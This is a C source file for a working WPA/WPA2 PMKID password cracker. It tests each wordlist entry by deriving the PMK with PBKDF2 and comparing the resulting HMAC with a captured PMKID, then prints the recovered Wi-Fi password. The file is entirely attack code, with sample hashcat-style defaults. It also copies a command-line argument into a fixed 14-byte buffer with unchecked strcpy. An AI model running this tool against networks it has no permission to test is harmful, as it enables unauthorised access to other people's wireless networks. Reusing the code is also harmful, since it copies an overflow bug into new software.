#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/evp.h>
#include <openssl/hmac.h>

#define MAX_LINE 1024
#define MAX_PASSLIST 1000000

// Default Values

char *pmkid = "4d4fe7aac3a2cecab195321ceb99a7d0";
unsigned char essid[] = "hashcat-essid";
unsigned char mac_ap[] = {0xfc, 0x69, 0x0c, 0x15, 0x82, 0x64};
unsigned char mac_cl[] = {0xf4, 0x74, 0x7f, 0x87, 0xf9, 0xf4};
char *passlist_src = "passlist.txt";


void hex_to_bytes(const char *hex, unsigned char *bytes, size_t len) {
    for (size_t i = 0; i < len; i++) {
        sscanf(hex + 2*i, "%2hhx", &bytes[i]);
    }
}

void print_hex(unsigned char *data, int len) {
    for (int i = 0; i < len; i++) {
        printf("%02x", data[i]);
    }
}

int crack_pmkid(const char *pmkid, const unsigned char *essid, const unsigned char *mac_ap,
                const unsigned char *mac_cl, char **passlist, int passlist_len) {
    unsigned char pmk[32];
    unsigned char message[23] = "PMK Name";
    unsigned char hmac_result[20];
    char hmac_hex[41];
    unsigned int hmac_len;

    memcpy(message + 8, mac_ap, 6);
    memcpy(message + 14, mac_cl, 6);

    for (int i = 0; i < passlist_len; i++) {
        PKCS5_PBKDF2_HMAC_SHA1(passlist[i], strlen(passlist[i]), essid, strlen((char*)essid), 4096, 32, pmk);

        HMAC(EVP_sha1(), pmk, 32, message, 20, hmac_result, &hmac_len);

        for (int j = 0; j < 16; j++) {
            sprintf(hmac_hex + (j * 2), "%02x", hmac_result[j]);
        }
        hmac_hex[32] = '\0';

        printf("%s\n", hmac_hex);

        if (strncmp(hmac_hex, pmkid, 32) == 0) {
            printf("\033[92m%s - Matches captured PMKID\n\n", hmac_hex);
            printf("Password Cracked!\n\033[0m\n");
            printf("SSID:             %s\n", essid);
            printf("Password:         %s\n\n", passlist[i]);
            return 1;
        }
    }
    return 0;
}

int main(int argc, char *argv[]) {
    char *passlist[MAX_PASSLIST];
    int passlist_len = 0;
    char line[MAX_LINE];
    FILE *file;

    // User Supplied Values
    if (argc > 1) pmkid = argv[1];
    if (argc > 2) strcpy((char*)essid, argv[2]);
    if (argc > 3) hex_to_bytes(argv[3], mac_ap, 6);
    if (argc > 4) hex_to_bytes(argv[4], mac_cl, 6);
    if (argc > 5) passlist_src = argv[5];

    // Read passlist.txt
    file = fopen(passlist_src, "r");
    if (file == NULL) {
        printf("Could not open file %s\n", passlist_src);
        return 1;
    }

    while (fgets(line, MAX_LINE, file) && passlist_len < MAX_PASSLIST) {
        line[strcspn(line, "\n")] = 0;  // Remove newline
        passlist[passlist_len] = strdup(line);
        passlist_len++;
    }
    fclose(file);

    if (!crack_pmkid(pmkid, essid, mac_ap, mac_cl, passlist, passlist_len)) {
        printf("Password not found in the list.\n");
    }

    // Free allocated memory
    for (int i = 0; i < passlist_len; i++) {
        free(passlist[i]);
    }

    return 0;
}